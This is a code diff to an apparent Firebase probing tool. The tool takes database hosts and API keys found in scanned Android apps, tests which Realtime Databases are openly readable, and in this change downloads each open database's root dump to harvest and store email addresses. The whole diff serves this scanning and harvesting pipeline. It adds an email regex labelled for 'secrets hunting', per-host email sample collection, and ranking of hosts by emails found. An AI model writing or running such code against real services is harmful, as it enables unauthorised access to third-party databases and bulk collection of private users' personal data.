@@ -12,6 +12,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 from typing import Any
 from urllib.error import HTTPError, URLError
+from urllib.parse import quote
 from urllib.request import Request, urlopen
 
 LOG = logging.getLogger("firebase_probe")
@@ -25,6 +26,33 @@ _FIREBASE_HOST_RE = re.compile(
     r")\b"
 )
 _GOOGLE_API_KEY_RE = re.compile(r"\b(AIza[0-9A-Za-z\-_]{35})\b")
+# Practical email matcher for open RTDB dumps (not RFC-perfect; tuned for secrets hunting).
+_EMAIL_RE = re.compile(
+    r"(?i)\b("
+    r"[a-z0-9](?:[a-z0-9._%+\-]{0,62}[a-z0-9])?"
+    r"@"
+    r"(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+"
+    r"[a-z]{2,24}"
+    r")\b"
+)
+_EMAIL_SKIP_DOMAINS = {
+    "example.com",
+    "example.org",
+    "example.net",
+    "test.com",
+    "email.com",
+    "domain.com",
+    "yourdomain.com",
+    "sentry.io",
+    "w3.org",
+    "schema.org",
+    "googleapis.com",
+    "google.com",
+    "firebase.com",
+    "firebaseio.com",
+    "firebaseapp.com",
+    "appspot.com",
+}
 
 # Skip known public demo / documentation hosts.
 _SKIP_HOSTS = {
@@ -34,6 +62,8 @@ _SKIP_HOSTS = {
     "your-project.firebaseio.com",
     "example.firebaseio.com",
 }
+
+_STATUS_RANK = {"open": 0, "denied": 1, "deactivated": 2, "not_found": 3, "error": 4}
 
 
 def extract_firebase_hosts(*texts: str) -> list[str]:
@@ -63,6 +93,28 @@ def extract_google_api_keys(*texts: str) -> list[str]:
                 continue
             seen.add(key)
             found.append(key)
+    return found
+
+
+def extract_emails(*texts: str) -> list[str]:
+    """Return unique emails found in text blobs (order preserved, lowercased)."""
+    found: list[str] = []
+    seen: set[str] = set()
+    for text in texts:
+        if not text:
+            continue
+        for m in _EMAIL_RE.finditer(text):
+            email = m.group(1).strip().lower()
+            if not email or email in seen:
+                continue
+            domain = email.rsplit("@", 1)[-1]
+            if domain in _EMAIL_SKIP_DOMAINS:
+                continue
+            # Skip obvious non-emails (file-like / package-like).
+            if any(email.endswith(ext) for ext in (".png", ".jpg", ".jpeg", ".gif", ".svg", ".js", ".css")):
+                continue
+            seen.add(email)
+            found.append(email)
     return found
 
 
@@ -106,11 +158,11 @@ def api_keys_from_job(job: dict[str, Any]) -> list[str]:
     return extract_google_api_keys(*chunks)
 
 
-def _http_get_json(url: str, timeout: float = 10.0) -> tuple[int, Any, str]:
+def _http_get_json(url: str, timeout: float = 10.0, max_bytes: int = 2_000_000) -> tuple[int, Any, str]:
     req = Request(url, headers={"User-Agent": USER_AGENT, "Accept": "application/json"})
     try:
         with urlopen(req, timeout=timeout) as resp:
-            raw = resp.read(2_000_000)  # cap 2MB — shallow probes are tiny
+            raw = resp.read(max_bytes)
             status = getattr(resp, "status", 200) or 200
             text = raw.decode("utf-8", errors="replace")
             try:
@@ -118,7 +170,7 @@ def _http_get_json(url: str, timeout: float = 10.0) -> tuple[int, Any, str]:
             except json.JSONDecodeError:
                 return int(status), None, text
     except HTTPError as exc:
-        raw = exc.read(500_000) if hasattr(exc, "read") else b""
+        raw = exc.read(min(500_000, max_bytes)) if hasattr(exc, "read") else b""
         text = raw.decode("utf-8", errors="replace") if raw else str(exc)
         try:
             return int(exc.code), json.loads(text), text
@@ -186,10 +238,42 @@ def _classify(http_status: int, payload: Any, raw_text: str) -> dict[str, Any]:
     }
 
 
+def _scan_emails_for_host(
+    host_n: str,
+    api_key: str | None,
+    used_api_key: bool,
+    timeout: float,
+) -> tuple[int, list[str]]:
+    """Fetch capped /.json dump and return (email_count, samples)."""
+    base = f"https://{host_n}/.json"
+    urls = [base]
+    if api_key and used_api_key:
+        urls.insert(0, f"{base}?auth={quote(api_key, safe='')}")
+    elif api_key:
+        urls.append(f"{base}?auth={quote(api_key, safe='')}")
+
+    best_emails: list[str] = []
+    for url in urls:
+        _status, payload, raw = _http_get_json(url, timeout=timeout, max_bytes=1_500_000)
+        blobs = [raw or ""]
+        if payload is not None:
+            try:
+                blobs.append(json.dumps(payload))
+            except (TypeError, ValueError):
+                pass
+        emails = extract_emails(*blobs)
+        if len(emails) > len(best_emails):
+            best_emails = emails
+        if best_emails:
+            break
+    return len(best_emails), best_emails[:20]
+
+
 def probe_host(
     host: str,
     api_key: str | None = None,
     timeout: float = 10.0,
+    scan_emails: bool = True,
 ) -> dict[str, Any]:
     host_n = host.strip().lower().rstrip("/")
     if host_n.startswith("https://"):
@@ -213,6 +297,8 @@ def probe_host(
             "http_status": http_status,
             "probed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
             "used_api_key": bool(api_key) and "auth=" in url,
+            "email_count": 0,
+            "email_samples": [],
             **classified,
         }
         if best is None:
@@ -224,7 +310,44 @@ def probe_host(
             best = result
             break
     assert best is not None
+
+    if scan_emails and best.get("dumpable"):
+        try:
+            count, samples = _scan_emails_for_host(
+                host_n,
+                api_key=api_key,
+                used_api_key=bool(best.get("used_api_key")),
+                timeout=timeout,
+            )
+            best["email_count"] = count
+            best["email_samples"] = samples
+            if count:
+                best["detail"] = (
+                    f"{best.get('detail') or 'Open'} — {count} email"
+                    f"{'s' if count != 1 else ''} found"
+                )
+        except Exception as exc:  # noqa: BLE001
+            LOG.debug("Email scan failed for %s: %s", host_n, exc)
+            best.setdefault("email_count", 0)
+            best.setdefault("email_samples", [])
+    else:
+        best.setdefault("email_count", 0)
+        best.setdefault("email_samples", [])
     return best
+
+
+def sort_newest_first(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    """Sort probe rows newest-first (probed_at desc), dumpable as soft tiebreaker."""
+    return sorted(
+        rows,
+        key=lambda r: (
+            str(r.get("probed_at") or ""),
+            1 if r.get("dumpable") else 0,
+            int(r.get("email_count") or 0),
+            str(r.get("host") or ""),
+        ),
+        reverse=True,
+    )
 
 
 def probe_hosts(
@@ -232,6 +355,7 @@ def probe_hosts(
     api_keys: list[str] | None = None,
     workers: int = 8,
     timeout: float = 10.0,
+    scan_emails: bool = True,
 ) -> list[dict[str, Any]]:
     uniq: list[str] = []
     seen: set[str] = set()
@@ -250,7 +374,7 @@ def probe_hosts(
 
     def _one(host: str) -> dict[str, Any]:
         try:
-            return probe_host(host, api_key=key, timeout=timeout)
+            return probe_host(host, api_key=key, timeout=timeout, scan_emails=scan_emails)
         except Exception as exc:  # noqa: BLE001
             return {
                 "host": host,
@@ -258,18 +382,19 @@ def probe_hosts(
                 "dumpable": False,
                 "detail": str(exc),
                 "http_status": 0,
+                "email_count": 0,
+                "email_samples": [],
                 "probed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
             }
 
     if workers_n == 1:
-        return [_one(h) for h in uniq]
+        return sort_newest_first([_one(h) for h in uniq])
 
     with ThreadPoolExecutor(max_workers=workers_n) as pool:
         futs = {pool.submit(_one, h): h for h in uniq}
         for fut in as_completed(futs):
             out.append(fut.result())
-    out.sort(key=lambda r: (not r.get("dumpable"), r.get("status") != "open", r.get("host") or ""))
-    return out
+    return sort_newest_first(out)
 
 
 def probe_job(job: dict[str, Any], timeout: float = 10.0) -> list[dict[str, Any]]:
@@ -295,12 +420,20 @@ def collect_hosts_from_results(results_dir: Path) -> list[tuple[str, str, str]]:
         "download-status.json",
         "loop-status.json",
         "firebase-access.json",
+        "admin-sdk-access.json",
+        "db-urls.json",
     }
     rows: list[tuple[str, str, str]] = []
     seen_host_apk: set[tuple[str, str]] = set()
     if not results_dir.is_dir():
         return []
-    for path in sorted(results_dir.glob("*.json")):
+    # Newest job files first so apk/package meta prefers recent finds.
+    paths = sorted(
+        results_dir.glob("*.json"),
+        key=lambda p: p.stat().st_mtime if p.exists() else 0.0,
+        reverse=True,
+    )
+    for path in paths:
         if path.name in skip:
             continue
         try:
@@ -311,6 +444,7 @@ def collect_hosts_from_results(results_dir: Path) -> list[tuple[str, str, str]]:
             continue
         apk = str(job.get("apk") or path.name)
         pkg = str(job.get("package") or "")
+        # Prefer already-probed hosts from the job (includes email counts).
         for host in hosts_from_job(job):
             key = (host, apk)
             if key in seen_host_apk:
@@ -320,49 +454,8 @@ def collect_hosts_from_results(results_dir: Path) -> list[tuple[str, str, str]]:
     return rows
 
 
-def probe_results_dir(
-    results_dir: Path,
-    workers: int = 10,
-    timeout: float = 10.0,
-) -> dict[str, Any]:
-    triples = collect_hosts_from_results(results_dir)
-    hosts = sorted({h for h, _, _ in triples})
-    # Attach first apk/package mapping
-    host_meta: dict[str, dict[str, str]] = {}
-    for host, apk, pkg in triples:
-        host_meta.setdefault(host, {"apk": apk, "package": pkg})
-
-    probed = probe_hosts(hosts, workers=workers, timeout=timeout)
-    for row in probed:
-        meta = host_meta.get(row["host"]) or {}
-        row["apk"] = meta.get("apk") or ""
-        row["package"] = meta.get("package") or ""
-
-    dumpable = [r for r in probed if r.get("dumpable")]
-    summary = {
-        "ok": True,
-        "probed": len(probed),
-        "dumpable_count": len(dumpable),
-        "open": [r for r in probed if r.get("status") == "open"],
-        "denied": [r for r in probed if r.get("status") == "denied"],
-        "deactivated": [r for r in probed if r.get("status") == "deactivated"],
-        "other": [
-            r
-            for r in probed
-            if r.get("status") not in ("open", "denied", "deactivated")
-        ],
-        "results": probed,
-        "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-    }
-    out_path = results_dir / "firebase-access.json"
-    results_dir.mkdir(parents=True, exist_ok=True)
-    out_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")
-    return summary
-
-
 def merge_firebase_results(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
-    """Dedupe by host; prefer dumpable/open."""
-    rank = {"open": 0, "denied": 1, "deactivated": 2, "not_found": 3, "error": 4}
+    """Dedupe by host; prefer dumpable/open, then richer email data, then newest."""
     best: dict[str, dict[str, Any]] = {}
     for row in rows:
         if not isinstance(row, dict):
@@ -374,13 +467,122 @@ def merge_firebase_results(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
         if prev is None:
             best[host] = row
             continue
-        prev_rank = rank.get(str(prev.get("status")), 9)
-        cur_rank = rank.get(str(row.get("status")), 9)
+        prev_rank = _STATUS_RANK.get(str(prev.get("status")), 9)
+        cur_rank = _STATUS_RANK.get(str(row.get("status")), 9)
         if cur_rank < prev_rank or (row.get("dumpable") and not prev.get("dumpable")):
+            # Keep prior email data if the newer/better status row lacks it.
+            merged = dict(row)
+            if merged.get("email_count") in (None, 0) and (prev.get("email_count") or 0) > 0:
+                merged["email_count"] = prev.get("email_count")
+                merged["email_samples"] = prev.get("email_samples") or []
+            best[host] = merged
+            continue
+        if cur_rank > prev_rank:
+            continue
+        # Same status band: prefer more emails, then newer probe.
+        prev_emails = int(prev.get("email_count") or 0)
+        cur_emails = int(row.get("email_count") or 0)
+        if cur_emails > prev_emails:
             best[host] = row
-    out = list(best.values())
-    out.sort(key=lambda r: (not r.get("dumpable"), rank.get(str(r.get("status")), 9), r.get("host") or ""))
-    return out
+            continue
+        if (row.get("probed_at") or "") > (prev.get("probed_at") or ""):
+            merged = dict(row)
+            if cur_emails == 0 and prev_emails > 0:
+                merged["email_count"] = prev.get("email_count")
+                merged["email_samples"] = prev.get("email_samples") or []
+            best[host] = merged
+    return sort_newest_first(list(best.values()))
+
+
+def build_firebase_summary(rows: list[dict[str, Any]], message: str = "") -> dict[str, Any]:
+    merged = merge_firebase_results(rows)
+    open_rows = [r for r in merged if r.get("status") == "open"]
+    dumpable = [r for r in merged if r.get("dumpable")]
+    email_total = sum(int(r.get("email_count") or 0) for r in merged)
+    hosts_with_email = sum(1 for r in merged if int(r.get("email_count") or 0) > 0)
+    return {
+        "ok": True,
+        "probed": len(merged),
+        "dumpable_count": len(dumpable),
+        "email_count": email_total,
+        "hosts_with_email": hosts_with_email,
+        "open": open_rows,
+        "denied": [r for r in merged if r.get("status") == "denied"],
+        "deactivated": [r for r in merged if r.get("status") == "deactivated"],
+        "other": [
+            r
+            for r in merged
+            if r.get("status") not in ("open", "denied", "deactivated")
+        ],
+        "results": merged,
+        "state": "idle",
+        "message": message
+        or (
+            f"{len(dumpable)} dumpable / {len(merged)} probed"
+            + (f" — {email_total} emails" if email_total else "")
+        ),
+        "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    }
+
+
+def write_firebase_summary(results_dir: Path, rows: list[dict[str, Any]], message: str = "") -> dict[str, Any]:
+    summary = build_firebase_summary(rows, message=message)
+    results_dir.mkdir(parents=True, exist_ok=True)
+    (results_dir / "firebase-access.json").write_text(
+        json.dumps(summary, indent=2),
+        encoding="utf-8",
+    )
+    return summary
+
+
+def probe_results_dir(
+    results_dir: Path,
+    workers: int = 10,
+    timeout: float = 10.0,
+) -> dict[str, Any]:
+    triples = collect_hosts_from_results(results_dir)
+    hosts = list(dict.fromkeys(h for h, _, _ in triples))  # preserve newest-first order
+    # Attach first apk/package mapping (already newest-first from collect)
+    host_meta: dict[str, dict[str, str]] = {}
+    for host, apk, pkg in triples:
+        host_meta.setdefault(host, {"apk": apk, "package": pkg})
+
+    # Reuse prior per-APK probe rows (may already include email counts) as a base.
+    prior_rows: list[dict[str, Any]] = []
+    skip = {
+        "status.json",
+        "summary.json",
+        "dashboard-config.json",
+        "download-status.json",
+        "loop-status.json",
+        "firebase-access.json",
+        "admin-sdk-access.json",
+        "db-urls.json",
+    }
+    if results_dir.is_dir():
+        for path in results_dir.glob("*.json"):
+            if path.name in skip:
+                continue
+            try:
+                job = json.loads(path.read_text(encoding="utf-8"))
+            except (OSError, json.JSONDecodeError):
+                continue
+            if isinstance(job, dict):
+                prior_rows.extend(job.get("firebase_access") or [])
+
+    probed = probe_hosts(hosts, workers=workers, timeout=timeout)
+    for row in probed:
+        meta = host_meta.get(row["host"]) or {}
+        row["apk"] = meta.get("apk") or row.get("apk") or ""
+        row["package"] = meta.get("package") or row.get("package") or ""
+
+    summary = build_firebase_summary(prior_rows + probed)
+    results_dir.mkdir(parents=True, exist_ok=True)
+    (results_dir / "firebase-access.json").write_text(
+        json.dumps(summary, indent=2),
+        encoding="utf-8",
+    )
+    return summary
 
 
 def main() -> int:
@@ -398,13 +600,14 @@ def main() -> int:
     )
     if args.host:
         rows = probe_hosts(args.host, workers=args.workers, timeout=args.timeout)
-        print(json.dumps({"ok": True, "results": rows}, indent=2))
+        print(json.dumps(build_firebase_summary(rows), indent=2))
         return 0
     summary = probe_results_dir(Path(args.results), workers=args.workers, timeout=args.timeout)
     print(json.dumps({
         "ok": summary["ok"],
         "probed": summary["probed"],
         "dumpable_count": summary["dumpable_count"],
+        "email_count": summary.get("email_count", 0),
         "updated_at": summary["updated_at"],
         "open_hosts": [r["host"] for r in summary["open"]],
     }, indent=2))
